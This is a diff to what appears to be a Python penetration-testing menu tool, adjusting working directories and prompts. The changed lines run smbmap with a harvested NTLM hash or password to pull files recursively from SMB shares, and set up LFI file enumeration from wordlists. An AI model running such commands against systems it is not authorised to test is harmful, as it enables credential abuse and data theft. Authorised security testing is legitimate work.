@@ -1597,6 +1597,7 @@ while True:
          FIL = spacePadding(FIL,COL1)
       else:
          FIL = BAK    
+      prompt()
  
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1612,7 +1613,8 @@ while True:
       if TSH != "":
          TSH = spacePadding(TSH,COL1)
       else:
-         TSH = BAK    
+         TSH = BAK
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2382,13 +2384,15 @@ while True:
       if checkParams != 1:
          checkParams = test_TSH()                  
       if checkParams != 1:
+         os.chdir(workDir)
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[+] Downloading any found files...")
-            runCommand("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
+            runCommand("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15 ")
          else:
             print("[+] Downloading any found files...")
-            runCommand("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
+            runCommand("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15 ") 
+         runCommand("cd ..")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3479,7 +3483,7 @@ while True:
       if checkParams != 1:
          print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
          if OSF[:5].upper() != "EMPTY":
-            os.chdir("BLACKBRIAR")
+            os.chdir(workDir)
             if OSF[:5].upper() == "LINUX":
                file1 = open("../TREADSTONE/linuxlfi.txt", 'r')
                Lines = file1.readlines()
